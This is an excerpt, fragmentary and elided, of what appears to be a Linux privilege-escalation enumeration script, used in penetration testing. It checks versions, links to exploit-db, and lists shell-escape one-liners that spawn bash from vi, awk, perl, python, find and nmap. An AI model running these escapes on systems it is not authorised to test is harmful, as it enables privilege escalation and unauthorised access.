...
### [Updates]: Antoine Cervoise -- @acervoise
...
def checkVer(version, min_ver, max_ver):
    version = version.split('.')
    min_ver = min_ver.split('.')
    for i in range(min(len(version), len(min_ver))):
        if int(version[i]) < int(min_ver[i]):
            return False
    max_ver = max_ver.split('.')
    for i in range(min(len(version), len(max_ver))):
        if int(version[i]) > int(max_ver[i]):
            return False
    return True
...
otherApps = { "SUDO":{"cmd":"sudo -V | grep version 2>/dev/null", "msg":"Sudo Version (Check out https://www.exploit-db.com/search?q=sudo&type=local)", "results":results},
...
escapeCmd = {"vi":[":!bash", ":set shell=/bin/bash:shell"], "awk":["awk 'BEGIN {system(\"/bin/bash\")}'"], "perl":["perl -e 'exec \"/bin/bash\";'"], "python":["python -c \"import os; os.system('/bin/bash');\""], "find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"], "nmap":["--interactive"]}
...
for sploit in sploits:
    ...
    sploitout = sploit + " || " + "https://www.exploit-db.com/exploits/" + sploits[sploit]["exploitdb"] + " || " + "Language=" + sploits[sploit]["lang"]
